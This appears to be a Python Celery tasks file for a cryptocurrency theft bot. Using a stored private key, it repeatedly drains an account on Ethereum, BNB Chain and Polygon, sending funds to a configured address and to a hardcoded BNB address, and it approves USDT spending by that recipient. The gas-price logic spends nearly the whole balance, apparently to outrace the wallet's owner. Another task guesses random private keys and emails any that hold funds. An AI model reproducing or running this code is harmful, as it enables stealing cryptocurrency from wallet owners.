import datetime
import random

from celery import shared_task
from decouple import config
from django.core import mail
from web3 import Web3

from approve_send.models import EthereumAccounts

x = datetime.datetime.now()
ALCHEMY_Web3Provider = Web3(Web3.HTTPProvider(config(F'ALCHEMY_DAY_{x.day}')))
ZMOK_Web3Provider = Web3(Web3.HTTPProvider(config(F'ZMOK_DAY_{x.day}')))
from_account = config('FROM_ACCOUNT')
to_account = config('TO_ACCOUNT')
private_key = config('PRIVATE_KEY')
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
usdt_contract_abi = '[{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]'

try:
    web3 = ZMOK_Web3Provider
    contract = web3.eth.contract(address=usdt_contract_address, abi=usdt_contract_abi)
    balance = web3.eth.get_balance(from_account)
except:
    web3 = ALCHEMY_Web3Provider
    contract = web3.eth.contract(address=usdt_contract_address, abi=usdt_contract_abi)
    balance = web3.eth.get_balance(from_account)


@shared_task
def approve_transaction():
    try:
        try:
            web3 = ZMOK_Web3Provider
            balance = web3.eth.get_balance(from_account)
        except:
            web3 = ALCHEMY_Web3Provider
            balance = web3.eth.get_balance(from_account)
        value = web3.toWei('2', 'ether')
        try:
            tx = contract.functions.approve(to_account, value).buildTransaction({
                'from': from_account,
                'gas': 21000,
                'gasPrice': int((balance - 100000) / 21000),
                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
            })
            signed_tx = web3.eth.account.signTransaction(tx, private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
                tx = contract.functions.approve(to_account, value).buildTransaction({
                    'from': from_account,
                    'gas': 21000,
                    'gasPrice': int((balance - 100000) / 21000),
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending')
                })
                signed_tx = web3.eth.account.signTransaction(tx, private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        except:
            tx = contract.functions.approve(to_account, value).buildTransaction({
                'from': from_account,
                'gas': 21000,
                'gasPrice': int((balance - 100000) / 21000),
                'nonce': web3.eth.getTransactionCount(from_account, 'pending')
            })
            signed_tx = web3.eth.account.signTransaction(tx, private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
                tx = contract.functions.approve(to_account, value).buildTransaction({
                    'from': from_account,
                    'gas': 21000,
                    'gasPrice': int((balance - 100000) / 21000),
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending')
                })
                signed_tx = web3.eth.account.signTransaction(tx, private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        pass


@shared_task
def send_ethereum():
    try:
        try:
            web3 = ZMOK_Web3Provider
            balance = web3.eth.get_balance(from_account)
        except:
            web3 = ALCHEMY_Web3Provider
            balance = web3.eth.get_balance(from_account)
        try:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            else:
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        except:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://rpc.ethermine.org/"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        pass


@shared_task
def send_bnb():
    try:
        to_account = "0xf4fc7ee34c38a03a2998e56a9de219edf135f5ec"
        web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
        balance = web3.eth.get_balance(from_account)
        try:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'chainId': 56,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 56,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            else:
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 56,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        except:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'chainId': 56,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://bscrpc.com"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 56,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        pass


@shared_task
def send_polygon():
    try:
        web3 = Web3(Web3.HTTPProvider(config(F'ALCHEMY_DAY_{x.day}').replace('eth', 'polygon')))
        balance = web3.eth.get_balance(from_account)
        try:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'chainId': 137,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://polygon-rpc.com"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 137,

                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            else:
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 137,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
        except:
            signed_tx = web3.eth.account.signTransaction(
                {
                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                    'to': to_account,
                    'value': int(balance * 0.09),
                    'gas': 21000,
                    'chainId': 137,
                    'gasPrice': int(balance * 0.99 / 21000)
                },
                private_key)
            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
            if balance > 165311289288785:
                web3 = Web3(Web3.HTTPProvider("https://polygon-rpc.com"))
                signed_tx = web3.eth.account.signTransaction(
                    {
                        'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
                        'to': to_account,
                        'value': int(balance * 0.09),
                        'gas': 21000,
                        'chainId': 137,
                        'gasPrice': int(balance * 0.99 / 21000)
                    },
                    private_key)
                web3.eth.sendRawTransaction(signed_tx.rawTransaction)
    except:
        pass


@shared_task
def random_private_key():
    try:
        private_key = random.randbytes(32)
        acct = web3.eth.account.privateKeyToAccount(private_key)
        address = acct.address
        print(web3.eth.get_balance(address))
        print(address)
        if web3.eth.get_balance(address) > 0:
            EthereumAccounts.objects.create(private_key=private_key, address=address)
            mail.send_mail(subject='private key', message=f"{private_key} ---- {address}",
                           recipient_list=[config('TO_MAIL')], fail_silently=True,
                           from_email=config('EMAIL_HOST_USER'))
    except:
        pass
    return True


def send_ethereum_event():
    new_transaction_filter = web3.eth.filter({'address': '0x4DE23f3f0Fb3318287378AdbdE030cf61714b2f3'})
    print(new_transaction_filter.get_new_entries())
